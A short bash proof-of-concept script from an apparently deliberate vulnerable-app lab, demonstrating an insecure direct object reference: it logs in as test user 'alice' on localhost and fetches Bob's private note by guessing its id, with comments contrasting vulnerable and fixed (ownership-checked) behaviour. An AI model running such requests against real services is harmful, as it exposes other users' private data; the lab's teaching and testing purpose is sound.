#!/usr/bin/env bash
# Vuln #5 — IDOR. Alice reads Bob's private note just by guessing its id.
# VULN: returns Bob's note. SECURE: 404 (ownership enforced in WHERE).
set -euo pipefail
BASE="${1:-http://localhost:3000}"
CURL="curl -sk"
SID=$($CURL -i -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw '{"username":"alice","password":"alicepass"}' \
  | grep -i set-cookie | sed 's/.*sid=\([^;]*\).*/\1/' | tr -d '\r')
echo "Alice requesting note 3 (owned by Bob):"
$CURL "$BASE/api/notes/3" -H "Cookie: sid=$SID"; echo
